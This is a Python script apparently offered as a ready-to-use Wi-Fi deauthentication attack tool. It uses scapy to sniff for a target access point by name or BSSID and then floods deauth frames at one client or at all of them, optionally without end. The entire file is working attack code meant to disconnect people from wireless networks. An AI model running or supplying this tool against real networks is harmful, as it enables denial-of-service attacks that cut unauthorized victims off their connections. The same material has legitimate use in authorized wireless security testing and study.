#!/usr/bin/env python3
from termcolor import colored
from scapy.all import RadioTap, Dot11, Dot11Deauth, sniff, sendp
import sys
import sys, signal, argparse, time
from alive_progress import alive_bar

def def_handler(sig, frame):
    print(colored(("\n[!] Exiting...\n"), "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class DeauthAttack:         
    def __init__(self, args):
        self.interface = args.interface
        self.bssid = args.bssid
        self.interval = args.interval
        self.mac = args.mac
        self.count = args.count

    @staticmethod
    def Arguments():
        parser = argparse.ArgumentParser(description="Deauth Attack", usage="%(prog)s -i -b -t [-m|-a] [-p|-I]")
        parser.add_argument("-i", required=True, dest="interface", help="Set interface [wlan0]")
        parser.add_argument("-m", dest="target", help="Set target MAC address [00:11:22:33:44:55]")
        parser.add_argument("-b", dest="bssid",  help="Set AP BSSID [00:11:22:33:44:55]")
        parser.add_argument("-e", dest="essid", help="Set AP ESSID [test]")
        parser.add_argument("-a", action="store_true", help="Deauth all users")
        parser.add_argument("-p", dest="packets", help="Set number of packets [100]")
        parser.add_argument("-l", "--loop", action="store_true", help="Send infinite packets")
        parser.add_argument("-t", required=True, dest="interval", help="Set interval between packets [0.1+]")
        args = parser.parse_args()
        try:
            if args.bssid and args.essid:
                print(colored("\n[!] Error: You can only use -b or -e\n", "red"))
                sys.exit(1)
            elif args.bssid or args.essid:
                if args.bssid:
                    if len(args.bssid) == 17:
                        args.bssid = args.bssid
                    else:
                        print(colored("\n[!] Error: Invalid BSSID\n", "red"))
                        sys.exit(1)
                elif args.essid:
                    args.bssid = DeauthAttack.essid_to_bssid(args.interface, args.essid)
        except:
            print(colored("\n[!] Error: Missing arguments [-b or -e]\n", "red"))
            sys.exit(1)
        try:
            if args.target and args.a:
                print(colored("\n[!] Error: You can only use -t or -a\n", "red"))
                sys.exit(1)
            elif args.target or args.a:
                if args.target:
                    if len(args.target) == 17:
                        args.mac = args.target
                    else:
                        print(colored("\n[!] Error: Invalid MAC address\n", "red"))
                        sys.exit(1)
                elif args.a:
                    args.mac = "ff:ff:ff:ff:ff:ff"
        except:
            print(colored("\n[!] Error: Missing arguments [-m or -a]\n", "red"))
            sys.exit(1)
        try:
            if args.packets and args.loop:
                print(colored("\n[!] Error: You can only use -p or -i\n", "red"))
                sys.exit(1)
            elif args.packets or args.loop:
                if args.packets:
                    args.count = int(args.packets)
                elif args.loop:
                    args.count = 1000000000
        except:
            print(colored("\n[!] Error: Missing arguments [-p or -l]\n", "red"))
            sys.exit(1)
        try:
            if float(args.interval) < 0.1:
                print(colored("\n[!] Error: Interval must be greater than 0.1\n", "red"))
                sys.exit(1)
            else:
                args.interval = float(args.interval)
        except:
            print(colored(f"\n[!] Error: {args.interval} is incorrect format [-i]\n", "red"))
            sys.exit(1)
        return args
    
    @staticmethod
    def essid_to_bssid(interface, essid):
        try:
            scan_results = []
            sniff(iface=interface, prn=lambda x: scan_results.append(x), timeout=10)
            for result in scan_results:
                if result.haslayer("Dot11Beacon"):
                    if result.info.decode("utf-8") == essid:
                        return result.addr3
        except:
            print(colored("\n[!] Error: Interface is down or monitor mode is disabled\n", "red"))
            sys.exit(1)

    def Packet(self):
        radiotap = RadioTap()
        dot11 = Dot11(addr1=self.mac, addr2=self.bssid, addr3=self.bssid)
        dot11_deauth = Dot11Deauth()
        packet = radiotap/dot11/dot11_deauth
        return packet

class Progress(DeauthAttack):
    def __init__(self, args):
        super().__init__(args)

    def Attack(self):
        packet = self.Packet()
        with alive_bar(self.count, stats=False, bar=False, spinner="radioactive", spinner_length=30, enrich_print=False, receipt=False) as bar:
            for _ in range(self.count):
                sendp(packet, iface=self.interface, count=1, inter=self.interval, verbose=False)
                bar()
    
    def Attack_Infinite(self):
        packet = self.Packet()
        with alive_bar(self.count, stats=False, monitor=False, bar=False, spinner="radioactive", spinner_length=30, enrich_print=False, receipt=False) as bar:
            for _ in range(self.count):
                sendp(packet, iface=self.interface, count=1, inter=self.interval, verbose=False)
                bar()

class Main:
    def __init__(self):
        self.args = DeauthAttack.Arguments()
        self.letters = name
        self.load_attack = Progress(self.args)

    def Attack(self):
        if self.args.loop:
            self.load_attack.Attack_Infinite()
        else:
            self.load_attack.Attack()

    def Start(self):
        print(colored(self.letters, "red")) 
        self.Attack()

name = str("""
_______   Made by: @PAJAR1T0  
__  __ \\______ __________ ___  
_  /_/ /_  __ `__ \\_  __ `__ \\  
_\\__, /_  / / / / /  / / / / / 
/____/ /_/ /_/ /_//_/ /_/ /_/  
""")

if __name__ == "__main__":
    Main().Start()
